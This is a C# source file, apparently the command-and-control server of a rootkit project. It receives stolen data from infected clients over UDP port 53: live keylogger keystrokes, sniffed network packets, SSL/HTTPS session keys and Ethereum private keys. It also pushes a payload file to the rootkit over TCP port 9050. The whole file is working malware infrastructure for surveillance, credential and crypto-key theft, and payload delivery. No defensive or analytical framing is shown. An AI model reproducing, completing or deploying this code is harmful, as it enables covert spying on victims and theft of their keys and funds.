using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading.Tasks;
using Terminal.Gui;

namespace Command_and_Control_C_
{    
    public class Network
    {
        private UdpClient udpc;
        private IPEndPoint ep = null;
        private Thread readThread;
        private Thread sendThread;

        public delegate void packetRealmTimeKey(String key);
        public event packetRealmTimeKey eventRealmTimeKey;

        public delegate void log(String log);
        public event log eventLog;

        public delegate void skb(StringBuilder sb);
        public event skb eventSkb;

        public delegate void sslHttps(String key);
        public event sslHttps eventSslHttps;
        public delegate void ethereumKey(String key);
        public event ethereumKey eventetheretumKey;

        public delegate void sendOk(int bytes);
        public event sendOk eventetsendOK;

        TcpListener server;

        private int portPayload = 9050;
        private int portCC = 53;

        public Network()
        {
            udpc = new UdpClient(portCC);
            IPEndPoint ep = new IPEndPoint(IPAddress.Any, 0);   
            readThread = new Thread(new ThreadStart(readData));
        }

        public void startServer(){
            readThread.Start();
        }

        public void stopServer(){
            readThread.Abort();
        }

        public void sendPayload(String path){
            sendThread = new Thread(new ParameterizedThreadStart(sendData));
            sendThread.Start(path);
        }

        /* This thread sends the payload to rootkit. */
        private void sendData(object data){
            server = new TcpListener(IPAddress.Any, portPayload); 
            server.Start();  // this will start the server

            TcpClient client = server.AcceptTcpClient();  //if a connection exists, the server will accept it

            NetworkStream ns = client.GetStream(); //networkstream is used to send/receive messages

            Stream FileStream = File.OpenRead(data.ToString());
            byte[] FileBuffer = new byte[FileStream.Length];
                
            FileStream.Read(FileBuffer, 0, (int)FileStream.Length);
            ns.Write(FileBuffer, 0, FileBuffer.GetLength(0));
            ns.Close();
            client.Close();
            server.Stop();

            String logSend = ("Payload sended | " + FileBuffer.Length + " bytes");
            eventLog?.Invoke(logSend); /* Log callback */
            eventetsendOK?.Invoke(FileBuffer.Length); /* sended ok callback */
        }
        /* This thread collects all packets received from the server. */
        private void readData()
        {
            Thread.Sleep(1 * 00);
            while(true)
            {
                //byte[] rdata = udpc.Receive(ref ep);
                Memory<byte> rdata = udpc.Receive(ref ep);
                // No allocations to get a subsection of the buffer.
                //PrintByteArray(rdata.ToArray());
                var actualReceived = rdata.Slice(0,2); // 0.1 coge un elemento
                //PrintByteArray(rdata.ToArray());
                switch (actualReceived.ToArray()[0])
                {
                    /*
                        * The length of the header never varies (2 bytes).
                        * These headers are the packet size and the client id.
                        * The normal size of the keylogger data packet is 8 bytes.
                            * This is 2 bytes for packet type.
                            * 2 bytes for client id.
                            * 2 bytes for struct padding to align to 32 bits.
                            * The next 4 remaining bytes are from the key pressed.
                        * In the other cases, the packet is not of a fixed size
                        * The packet is composed of:
                            * 2 bytes for the packet type
                            * 2 bytes of the client id
                            * The previous 2 bytes of padding
                            * 4 bytes of padding leaving space for the key.
                            * After the above, there is the packet data without the header.
                        
                    */
                    case (byte)pckSendType.PCK_REAL_TIME_KEY:
                        var data = rdata.Slice(4).ToArray();
                        var pck = new pckSend_RealTimeKeylogger();
                        pck = ByteArrayToStructure<pckSend_RealTimeKeylogger>(data);
                        char key = (char)pck.key;
                        String log = (ep.Address.ToString() + ":" + ep.Port.ToString()+ " Realtime: id: " + actualReceived.ToArray()[1] + " key: " + key);
                        eventLog?.Invoke(log);
                        eventRealmTimeKey?.Invoke(key.ToString());
                        break;
                    case (byte)pckSendType.PCK_NET:
                        var dataSkb = rdata.Slice(8).ToArray();
                        String logSKB = (ep.Address.ToString() + ":" + ep.Port.ToString()+ " Network Packet: id: " + actualReceived.ToArray()[1] + " " +dataSkb.Length +" Bytes");
                        StringBuilder sb = processSkb(dataSkb);
                        //StringBuilder sb = new StringBuilder();
                        //sb.Append(System.Text.Encoding.ASCII.GetString(dataSkb));
                        eventLog?.Invoke(logSKB);
                        eventSkb?.Invoke(sb);
                        break;
                    case (byte)pckSendType.PCK_SSL:
                        var dataSSL = rdata.Slice(8).ToArray();
                        String sslKeys = System.Text.Encoding.Default.GetString(dataSSL).TrimEnd((Char)0);
                        String logSSL = (ep.Address.ToString() + ":" + ep.Port.ToString()+ " SSL_Keys: id: " + actualReceived.ToArray()[1] + " " +sslKeys);
                        eventLog?.Invoke(logSSL);
                        eventSslHttps?.Invoke(sslKeys);
                        break;
                    case (byte)pckSendType.PCK_EKEY:
                        var dataKey = rdata.Slice(8).ToArray();
                        String ethereumKey = System.Text.Encoding.ASCII.GetString(dataKey).TrimEnd((Char)0);
                        String logKey = (ep.Address.ToString() + ":" + ep.Port.ToString()+ " Ethereum_Key: id: " + actualReceived.ToArray()[1] + " " +ethereumKey + " " +dataKey.Length +" Bytes");
                        eventLog?.Invoke(logKey);
                        eventetheretumKey?.Invoke(ethereumKey);
                    break;

                }       
                
            }
        }


        private void PrintByteArray(byte[] bytes)
        {
            var sb = new StringBuilder("new byte[] { ");
            foreach (var b in bytes)
            {
                sb.Append(b + ", ");
            }
            sb.Append("}");
            Console.WriteLine(sb);
        }

        	
        static T ByteArrayToStructure<T>(byte[] bytes) where T : struct
        {
            var handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            var result = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
            handle.Free();
            return result;
        }

        private StringBuilder processSkb_original(Byte[]x)
        {
            //Console.WriteLine("Longitud array: " + x.Length);
            StringBuilder sb ;
            do{
            sb = new StringBuilder();
            int i;
            sb.AppendFormat("\n");
            sb.AppendFormat("000000 ");
            for (i = 0; i < x.Length; i++)
            {
                sb.AppendFormat("{0:X2} ",(UInt32)x[i]);
                if (15 == i%16){
                    sb.AppendFormat("\n{0:X6} ",(i + 1));
                }
            }
            sb.AppendFormat("\n");
            }while(false);

            //Console.WriteLine(sb.ToString());
            return sb;
        }

        private StringBuilder processSkb2(Byte[]x)
        {
            var sb = new StringBuilder("new byte[] { ");
            foreach (var b in x)
            {
                sb.Append(b + ", ");
            }
            sb.Append("}");
            return sb;
        }

        /*
            * Processes the skb data to a format that can then be converted for use with wiresark .pcap
            * With the following command: 
            *    cat xx.x.xxxx_networkData.txt | text2pcap - dump.pcap
         */
        private StringBuilder processSkb(Byte[]data)
        {
            var sb = new StringBuilder();
            int size = data.Length;
            int counter = 0;
            sb.AppendFormat("\n");
            sb.AppendFormat("000000 ");
            for (int x = 0;x<size;x++){
                sb.AppendFormat("{0:X2} ",(UInt32) data[x]);
                counter ++;
                if ((counter%16)==0 && (x+1<size)){
                    sb.AppendFormat("\n{0:X6} ",(counter));    
                }
            }
            return sb;
        }

    }
}